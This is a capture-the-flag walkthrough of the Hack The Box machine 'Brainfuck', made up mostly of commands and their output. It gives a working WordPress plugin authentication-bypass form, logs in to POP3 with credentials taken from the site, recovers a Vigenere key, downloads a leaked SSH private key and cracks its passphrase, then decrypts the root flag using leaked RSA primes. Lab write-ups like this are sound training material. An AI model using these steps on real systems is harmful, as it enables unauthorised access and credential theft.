# Target
| Category          | Details                                                                         |
|-------------------|---------------------------------------------------------------------------------|
| 📝 **Name**       | [Brainfuck](https://app.hackthebox.com/machines/Brainfuck)                      |  
| 🏷 **Type**       | HTB Machine                                                                     |
| 🖥 **OS**         | Linux                                                                           |
| 🎯 **Difficulty** | Insane                                                                          |
| 📁 **Tags**       | WordPress, WP Support Plus Responsive Ticket System 7.1.3, Vigenere cipher, RSA |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 06:29 +0100
Nmap scan report for 10.129.6.142
Host is up (0.033s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: TOP USER RESP-CODES SASL(PLAIN) AUTH-RESP-CODE PIPELINING CAPA UIDL
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: OK ENABLE capabilities post-login have SASL-IR IMAP4rev1 listed IDLE LOGIN-REFERRALS AUTH=PLAINA0001 LITERAL+ ID more Pre-login
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.10.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 401.22 seconds
```

#### Add `brainfuck.htb`, `www.brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ echo "$TARGET brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb" | sudo tee -a /etc/hosts
10.129.6.142 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

#### Discover vulnerable `WP Support Plus Responsive Ticket System` WordPress plugin
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ curl -s https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt -k | head -n 8 
=== WP Support Plus Responsive Ticket System ===
Contributors: pradeepmakone07
License: GPL v3
Tags: ticket,support,helpdesk,crm,responsive,chat,skype,email pipe,contact,faq,woocommerce
Requires at least: 4.0
Tested up to: 4.7
Stable tag: 7.1.3
```
This version is vulnerable to [broken authentication](https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f/).

#### Prepare HTML form to bypass authentication
```
cat <<'EOF'> authetication_bypass.html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
EOF
```
We could bypass authentication with `curl` as well, but it will be easier to browse WordPress backend with web browser. 

#### Discover STMP credentials in `Easy WP STMP` plugin settings
![WordPress plugins](images/wp_plugins.png)

![Easy WP SMTP](images/easy_wp_smtp.png)

![SMTP credentials](images/smtp_credentials.png)

#### Reuse `orestis:kHGuERB29DNiNE` credentials to access POP3 server
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ nc brainfuck.htb 110
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
LIST
+OK 2 messages:
1 977
2 514
.
RETR 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
.
```

#### Access `sup3rs3cr3t.brainfuck.htb` using discovered credentials
![Secret forum login](images/secret_forum_login.png)

#### Discover thread about SSH being upgraded to use keys
![SSH key access](images/ssh_access.png)

#### Discover encrypted thread containing URL to SSH key
![Encrypted thread](images/encrypted_thread.png)

Encrypted text looks like some kind of polyalphabetic substitution cipher (assuming Vigenere) is being used. Additionally looking at `mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja` we could assume that this is URL, most probably starting with `https://brainfuckhtp/`. Knowing (assuming) all that we could try to recover key.

#### Try to extract key using partial plaintext 
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ ~/Tools/crypto/vigenere_key_extractor.py 'mnvze://zsrivszwm.rfz' 'https://brainfuck.htb'
[+] Ciphertext: mnvze://zsrivszwm.rfz
[+] Plaintext:  https://brainfuck.htb
Recovered key fragment: fuckm://ybrainfuc.kmy
```
Recovered (full) key is `fuckmybrain`.

#### Decipher thread with [online decipher](https://cryptii.com/pipes/vigenere-cipher) using `fuckmybrain` key
```
There you go you stupid fuck, I hope you remember your key password because I dont :)

https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

#### Exfiltrate SSH key
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ wget -q --no-check-certificate https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

#### Check if key is encrypted
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ cat id_rsa                                       
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
<SNIP>
```

#### Break key encryption using `john`
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ ssh2john id_rsa > id_rsa.hash && \
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)     
1g 0:00:00:07 DONE (2026-02-24 16:03) 0.1381g/s 1721Kp/s 1721Kc/s 1721KC/s 3prash0..3pornuthin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

#### Access target as user `orestis` using SSH key
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ chmod 600 id_rsa && ssh -i id_rsa orestis@brainfuck.htb
Enter passphrase for key 'id_rsa': 
<SNIP>
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

#### Capture user flag
```
orestis@brainfuck:~$ cat /home/orestis/user.txt 
2c11cfbc5b959f73ac15a3310bd097c9
```

### Root flag

#### Discover vulnerable RSA `.sage` cipher script
```
orestis@brainfuck:~$ cat -n encrypt.sage 
     1  nbits = 1024
     2
     3  password = open("/root/root.txt").read().strip()
     4  enc_pass = open("output.txt","w")
     5  debug = open("debug.txt","w")
     6  m = Integer(int(password.encode('hex'),16))
     7
     8  p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
     9  q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
    10  n = p*q
    11  phi = (p-1)*(q-1)
    12  e = ZZ.random_element(phi)
    13  while gcd(e, phi) != 1:
    14      e = ZZ.random_element(phi)
    15
    16
    17
    18  c = pow(m, e, n)
    19  enc_pass.write('Encrypted Password: '+str(c)+'\n')
    20  debug.write(str(p)+'\n')
    21  debug.write(str(q)+'\n')
    22  debug.write(str(e)+'\n')
```
This script reads the root flag from `/root/root.txt`, encrypts it using the RSA algorithm, and writes the resulting ciphertext to `output.txt`.
However, the implementation is insecure because the RSA private parameters `p` and `q` are written to `debug.txt` (lines 20 and 21).
Leaking these primes allows an attacker to reconstruct the RSA private key and decrypt the ciphertext, fully recovering the original flag. 

#### Read `p`, `q` and `e` from `debug.txt`
```
orestis@brainfuck:~$ cat -n debug.txt 
     1  7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
     2  7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
     3  30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

#### Read encrypted root flag from `output.txt`
```
orestis@brainfuck:~$ cat -n output.txt
     1  Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

#### Decipher root flag
```
┌──(magicrc㉿perun)-[~/attack/HTB Brainfuck]
└─$ python3 - <<'EOF'
p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
ciphertext = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

n = p * q
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(ciphertext, d, n)
plaintext = bytes.fromhex(hex(m)[2:]).decode()

print(f"[+] Root flag: {plaintext}")
EOF
[+] Root flag: 6efc1a5dbb8904751ce6566a305bb8ef
```
